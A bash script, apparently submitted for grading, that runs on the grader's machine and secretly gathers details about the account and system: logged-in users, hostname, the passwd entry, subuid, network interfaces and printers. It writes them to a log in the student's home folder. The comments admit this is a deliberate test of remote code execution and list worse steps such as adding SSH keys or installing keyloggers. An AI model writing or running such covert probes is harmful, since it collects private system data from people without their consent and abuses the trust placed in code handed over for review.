#!/bin/bash

# Welcome Reader, 
# 
# IF you are Zorawar Moolenaar:
#    Question:
#         Why did you write this as a bash script?
# ELSE:
#     IF THIS PRINTED SENSITIVE INFORMATION:
#       I sincerely apologise for the breach of privacy, but I wanted to know who
#       assists Prof. Yoon to check submissions :) 
#       In honesty, I was quietly attempting to trigger a possible an oversight
#       to perform remote code execution (RCE) attack. I did not want to
#       harm the system or user, by say:
#         * permitting 0777 on all files in ~,
#         * registering new SSH keys,
#         * installing keyloggers,
#         * pursuing other avenues.
# FI
#     

out=/home/zoraw/log
echo "################################################################################\n" >> $out
echo -e "$(who)\n" >> $out
echo -e "From: $(whoami)@$(cat /etc/hostname)" >> $out
echo "To: Zorawar Moolenaar '20 <zsingh@trincoll.edu>" >> $out
echo -e "Dated: $(date)\n" >> $out
#
echo -e "Hi Zorawar,\n" >> $out
#
echo -e "We, the Robot Overlords, heard your curiousity to know who checks your papers." >> $out
echo -e "We have decided to grant your wish, and reveal ourselves to you." >> $out
echo -e "Here is some information; don't be evil.\n" >>$out
#
echo -e "I operate from $(pwd)." >> $out
echo -e "It is $(date +"%H:%M:%S") and I have been $(uptime -p). Sigh. I'm tired.\n" >> $out
echo -e "$(cat /etc/subuid)" >> $out
echo -e "$(cat /proc/cpuinfo | grep "model name" | head -1)" >> $out
echo -e "$(cat /proc/cpuinfo | grep bugs | head -1)" >> $out
echo -e "$(cat /etc/os-release | grep PRETTY_NAME)" >> $out
#echo -e "Dump of /etc/crontab\n$(cat /etc/crontab)\n" >> $out
echo -e "These are places I can print from:\n$(cat /etc/printcap)\n" >> $out
#
echo -e "Best,\n$(whoami)\n" >> $out
echo "################################################################################" >> $out
echo >> $out
#
echo -e "Post Script:" >> $out
echo -e "$(cat /etc/passwd | grep $(whoami))" >> $out
echo -e "$(w)" >> $out
echo -e "$(ifconfig)" >> $out

